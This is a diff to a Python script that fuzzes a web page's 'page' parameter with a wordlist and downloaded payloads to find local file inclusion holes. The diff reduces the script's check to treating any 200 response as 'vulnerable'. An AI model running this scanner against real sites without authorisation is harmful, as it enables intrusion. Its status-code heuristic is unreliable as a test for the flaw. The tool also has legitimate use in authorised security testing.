@@ -4,7 +4,7 @@ import argparse
 def test_vulnerability(url):
     response = requests.get(url, allow_redirects=False)
     status_code = response.status_code
-    return status_code == 302 or status_code == 200
+    return status_code == 200
 
 def download_payloads(url):
     try:
@@ -28,7 +28,6 @@ def main():
         print("No payloads downloaded. Exiting.")
         return
 
-    custom_dictionary = []
     with open(args.wordlist, "r") as wordlist_file:
         custom_dictionary = [line.strip() for line in wordlist_file]
 
@@ -36,11 +35,7 @@ def main():
         for payload in payloads:
             full_url = f"{args.url}?page={word}={payload}"
             if test_vulnerability(full_url):
-                status_code = "302" if test_vulnerability(full_url) else "200"
-                print(f"Status: {status_code} - Vulnerable to LFI: {full_url}")
-            else:
-                status_code = "302" if test_vulnerability(full_url) else "200"
-                print(f"Status: {status_code} - Not vulnerable to LFI: {full_url}")
+                print(f"Vulnerable to LFI: Word: {word}, URL: {full_url}")
 
 if __name__ == "__main__":
     main()
